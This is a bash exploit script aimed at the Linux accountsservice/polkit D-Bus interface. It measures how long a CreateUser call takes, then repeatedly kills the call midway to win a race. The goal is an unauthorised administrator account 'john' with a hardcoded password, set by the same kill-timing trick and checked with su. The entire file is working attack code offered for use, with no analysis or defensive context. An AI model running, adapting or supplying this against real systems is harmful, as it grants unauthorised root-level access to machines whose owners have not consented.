#!/bin/bash

# Customizable variables
ROOT_USER="john"
ROOT_PASS="john@123"
USER_FULLNAME="John Doe"

# Function to measure time for dbus-send
measure_time() {
    TIME_TAKEN=$({ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:"$ROOT_USER" string:"$USER_FULLNAME" int32:1; } 2>&1 | grep real | awk '{print $2}')
    
    # Convert the format "0m0.058s" to a pure number (e.g., 0.058)
    TIME_IN_SECONDS=$(echo "$TIME_TAKEN" | sed -E 's/([0-9]+)m([0-9.]+)s/\1*60+\2/' | bc 2>/dev/null)

    # Ensure conversion was successful
    if [[ -z "$TIME_IN_SECONDS" || "$TIME_IN_SECONDS" == "0" ]]; then
        echo "Error: Failed to measure execution time."
        exit 1
    fi

    echo "$TIME_IN_SECONDS"
}

# Measure time for the command
TIME=$(measure_time)

# Ensure TIME is valid
if [[ -z "$TIME" ]]; then
    echo "Error: TIME measurement failed."
    exit 1
fi

echo "Measured execution time: $TIME seconds"

# Convert to seconds and calculate half
HALF_TIME=$(echo "scale=4; $TIME * 0.5" | bc 2>/dev/null)

# Ensure HALF_TIME is valid before proceeding
if [[ -z "$HALF_TIME" || "$HALF_TIME" == "0" ]]; then
    echo "Error: HALF_TIME calculation failed."
    exit 1
fi

echo "Half of execution time: $HALF_TIME seconds"

# Attempt to exploit by killing dbus-send at the right moment
for i in {1..10}  # Try multiple times due to timing variability
do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:"$ROOT_USER" string:"$USER_FULLNAME" int32:1 &
    PID=$!
    sleep "$HALF_TIME"
    
    if kill -0 $PID 2>/dev/null; then  # Check if still running
        kill $PID
        echo "Attempt $i: dbus-send killed at HALF_TIME."
    fi

    # Check if user was created
    if id "$ROOT_USER" &>/dev/null; then
        echo "User '$ROOT_USER' created. Exploit successful."
        break
    else
        echo "Attempt $i failed. Retrying..."
    fi
done

# Set password for the new user (if created)
if id "$ROOT_USER" &>/dev/null; then
    echo "Setting password for user '$ROOT_USER'..."
    
    # Generate a password hash
    PASSWORD_HASH=$(openssl passwd -5 "$ROOT_PASS")
    
    for i in {1..10}
    do
        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply "/org/freedesktop/Accounts/User$(id -u "$ROOT_USER")" org.freedesktop.Accounts.User.SetPassword string:"$PASSWORD_HASH" string:"pass test" &
        PID=$!
        sleep "$HALF_TIME"
        
        if kill -0 $PID 2>/dev/null; then
            kill $PID
        fi
        
        # Check if password was set by trying to log in
        if echo "$ROOT_PASS" | su - "$ROOT_USER" -c 'echo "Password set"' 2>/dev/null; then
            echo "Password set for '$ROOT_USER'. Exploit complete."
            break
        else
            echo "Password setting attempt $i failed. Retrying..."
        fi
    done
else
    echo "Exploit failed to create user."
fi
